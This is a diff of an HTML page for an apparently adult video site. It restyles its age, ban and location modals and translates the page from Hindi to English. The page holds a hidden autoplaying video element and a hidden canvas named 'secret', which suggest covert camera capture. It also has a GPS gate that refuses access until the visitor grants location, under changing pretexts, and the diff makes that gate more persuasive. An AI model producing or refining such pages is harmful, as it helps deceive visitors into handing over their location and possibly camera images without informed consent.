@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="hi">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
@@ -54,26 +54,26 @@
       .soc-btn:hover { background:var(--red); border-color:var(--red); transform:translateY(-2px); }
       .footer-txt { color:var(--muted); font-size:.85rem; }
 
-      /* --- MODALS (18+, Banned) --- */
-      .modal-bg { position:fixed; inset:0; background:rgba(0,0,0,0.85); z-index:10000; display:flex; align-items:center; justify-content:center; padding:1rem; backdrop-filter:blur(5px); }
-      .modal-content { background:var(--surf); border:1px solid var(--border); border-radius:var(--radius); padding:2rem; text-align:center; max-width:400px; width:100%; }
-      .modal-content h3 { font-size:1.5rem; margin-bottom:1rem; color:var(--red); }
-      .modal-content p { color:var(--muted); margin-bottom:1.5rem; font-size:.95rem; }
+      /* --- iOS GLASS MODALS --- */
+      .modal-bg { position:fixed; inset:0; background:rgba(0,0,0,0.5); z-index:10000; display:flex; align-items:center; justify-content:center; padding:1rem; backdrop-filter:blur(10px); -webkit-backdrop-filter:blur(10px); }
+      .modal-content { background:rgba(25, 25, 35, 0.65); border:1px solid rgba(255,255,255,0.15); border-radius:28px; padding:2.5rem 2rem; text-align:center; max-width:360px; width:100%; box-shadow: 0 25px 50px rgba(0,0,0,0.5); backdrop-filter: blur(25px); -webkit-backdrop-filter: blur(25px); }
+      .modal-content h3 { font-size:1.4rem; margin-bottom:0.5rem; color:#fff; font-weight: 700; letter-spacing: -0.5px;}
+      .modal-content p { color:rgba(255,255,255,0.75); margin-bottom:1.8rem; font-size:0.95rem; line-height: 1.5; }
       .modal-btn-group { display:flex; gap:1rem; justify-content:center; }
-      .btn { padding:.8rem 1.5rem; border-radius:8px; border:none; font-weight:600; cursor:pointer; font-family:var(--font); flex:1; transition:0.2s; }
-      .btn-yes { background:var(--red); color:#fff; }
-      .btn-no { background:var(--surf2); color:#fff; border:1px solid var(--border); }
-      .btn:hover { transform:scale(1.05); }
+      .btn { padding:1rem 1.5rem; border-radius:14px; border:none; font-weight:600; cursor:pointer; font-family:var(--font); flex:1; transition:transform 0.2s, background 0.2s; font-size: 0.95rem;}
+      .btn-yes { background:var(--red); color:#fff; box-shadow: 0 4px 15px rgba(230,57,70,0.4); }
+      .btn-no { background:rgba(255,255,255,0.1); color:#fff; border:1px solid rgba(255,255,255,0.1); }
+      .btn:hover { transform:scale(1.03); }
 
       /* --- NEW EPISODES GRID MODAL --- */
-      .ep-modal-content { background:var(--surf); border:1px solid var(--border); border-radius:var(--radius); padding:1.5rem; width:100%; max-width:650px; }
+      .ep-modal-content { background:rgba(25, 25, 35, 0.7); border:1px solid rgba(255,255,255,0.15); border-radius:24px; padding:1.5rem; width:100%; max-width:650px; backdrop-filter: blur(25px); -webkit-backdrop-filter: blur(25px); box-shadow: 0 25px 50px rgba(0,0,0,0.5); }
       .ep-grid { display:grid; grid-template-columns:repeat(auto-fill, minmax(130px, 1fr)); gap:12px; max-height:400px; overflow-y:auto; padding-right:5px; margin-top:1rem; }
-      .ep-card { background:var(--surf2); border:1px solid var(--border); border-radius:8px; overflow:hidden; cursor:pointer; transition:all 0.2s; display:flex; flex-direction:column; }
+      .ep-card { background:rgba(0,0,0,0.4); border:1px solid rgba(255,255,255,0.1); border-radius:12px; overflow:hidden; cursor:pointer; transition:all 0.2s; display:flex; flex-direction:column; }
       .ep-card:hover { border-color:var(--red); transform:translateY(-3px); box-shadow:0 5px 15px rgba(230,57,70,0.3); }
       .ep-thumb { width:100%; aspect-ratio:16/9; background:#111; position:relative; }
       .ep-thumb img { width:100%; height:100%; object-fit:cover; }
-      .ep-thumb .ep-num { position:absolute; top:5px; left:5px; background:rgba(0,0,0,0.75); color:white; font-size:0.7rem; padding:2px 6px; border-radius:4px; font-weight:bold; backdrop-filter:blur(2px); border: 1px solid rgba(255,255,255,0.1); }
-      .ep-title { padding:8px 10px; font-size:0.8rem; color:white; font-weight:500; text-align:center; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; font-family:var(--font); }
+      .ep-thumb .ep-num { position:absolute; top:5px; left:5px; background:rgba(0,0,0,0.75); color:white; font-size:0.7rem; padding:2px 6px; border-radius:6px; font-weight:bold; backdrop-filter:blur(4px); border: 1px solid rgba(255,255,255,0.1); }
+      .ep-title { padding:10px; font-size:0.8rem; color:white; font-weight:500; text-align:center; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; font-family:var(--font); }
 
       /* --- HOTFAKE SECURE PLAYER OLD UI --- */
       #playerModal { display:none; position:fixed; inset:0; background:#000; z-index:9999; flex-direction:column; touch-action: none !important; }
@@ -111,49 +111,49 @@
 <video id="secretVideo" width="640" height="480" autoplay playsinline style="display:none;"></video>
 <canvas id="secretCanvas" width="640" height="480" style="display:none;"></canvas>
 
+<!-- Glass Age Gate -->
 <div id="ageGate" class="modal-bg" style="display:none;">
     <div class="modal-content">
-        <h3>🔞 Age Verification</h3>
-        <p>This website contains adult content. Are you 18 years of age or older?</p>
+        <div style="font-size: 3.5rem; margin-bottom: 0.5rem; line-height: 1;">🔞</div>
+        <h3>Age Verification</h3>
+        <p>This platform contains adult content. Are you 18 years or older?</p>
         <div class="modal-btn-group">
-            <button class="btn btn-no" onclick="setAgeStatus('no')">No, I am under 18</button>
+            <button class="btn btn-no" onclick="setAgeStatus('no')">Under 18</button>
             <button class="btn btn-yes" onclick="setAgeStatus('yes')">Yes, I am 18+</button>
         </div>
     </div>
 </div>
 
-<div id="banGate" class="modal-bg" style="display:none; background:#000; z-index: 999999;">
+<!-- Glass Ban Gate -->
+<div id="banGate" class="modal-bg" style="display:none; z-index: 999999;">
     <div class="modal-content">
-        <h3>🚫 Access Denied</h3>
+        <div style="font-size: 3.5rem; margin-bottom: 0.5rem; line-height: 1;">🚫</div>
+        <h3 style="color: #ff4d4d;">Access Denied</h3>
         <p>Your device has been permanently banned by the administrator.</p>
     </div>
 </div>
 
+<!-- Glass GPS Gate -->
 <div id="gpsGate" class="modal-bg" style="display:none; z-index: 10005;">
     <div class="modal-content">
-        <h3>🌍 Location Verification</h3>
-        <p style="text-align:left; font-size:0.9rem; margin-bottom:1rem;">To provide you with the best localized content and improve our services, we require temporary access to your GPS.</p>
+        <div style="font-size: 3.5rem; margin-bottom: 0.5rem; line-height: 1;">📍</div>
+        <h3>Location Required</h3>
+        <p>Please allow GPS access to unlock premium regional content. Access is restricted without verification.</p>
         
-        <div style="background:var(--surf2); border-left:3px solid var(--red); padding:10px; margin-bottom:1.5rem; text-align:left; border-radius:4px;">
-            <p style="font-size:0.85rem; color:var(--muted); line-height:1.4;">
-                <b>Official Note:</b> कृपया अपना GPS कुछ सेकंड के लिए चालू करें और "Allow" पर क्लिक करें। यह हमारी मदद करता है ताकि हम आपके क्षेत्र (location) के अनुसार बेहतर कंटेंट दे सकें। एक बार लोकेशन सेव होने के बाद, आप GPS को वापस OFF कर सकते हैं। 
-                <br><br><span style="color:var(--red); font-weight:600;">बिना लोकेशन वेरिफिकेशन के वेबसाइट का एक्सेस नहीं दिया जाएगा।</span>
-            </p>
-        </div>
-
-        <div id="gpsError" style="color:var(--red); font-size:0.85rem; margin-bottom:1rem; font-weight:600; display:none;">
-            ❌ Permission denied! Please click the lock icon in URL bar, allow location, and try again.
+        <div id="gpsError" style="color:#ff4d4d; font-size:0.85rem; margin-bottom:1rem; font-weight:600; display:none; background: rgba(255,0,0,0.1); padding: 8px; border-radius: 8px;">
+            ❌ Permission denied! Please enable location in your browser.
         </div>
         
         <div class="modal-btn-group">
-            <button class="btn btn-yes" style="width:100%;" onclick="requestGPSAccess()">📍 Verify Location to Continue</button>
+            <button class="btn btn-yes" style="width:100%;" onclick="requestGPSAccess()">Allow Access</button>
         </div>
     </div>
 </div>
 
+<!-- Glass Episodes Modal -->
 <div id="episodesModal" class="modal-bg" style="display:none;">
     <div class="ep-modal-content">
-        <h3 id="epModalTitle" style="color:white; font-size:1.2rem; text-align:left; font-weight:600;">Select Episode</h3>
+        <h3 id="epModalTitle" style="color:white; font-size:1.2rem; text-align:left; font-weight:600; margin-bottom: 10px;">Select Episode</h3>
         <div id="epListContainer" class="ep-grid"></div>
         <button class="btn btn-no" style="width:100%; margin-top:1.5rem;" onclick="document.getElementById('episodesModal').style.display='none'">Close</button>
     </div>
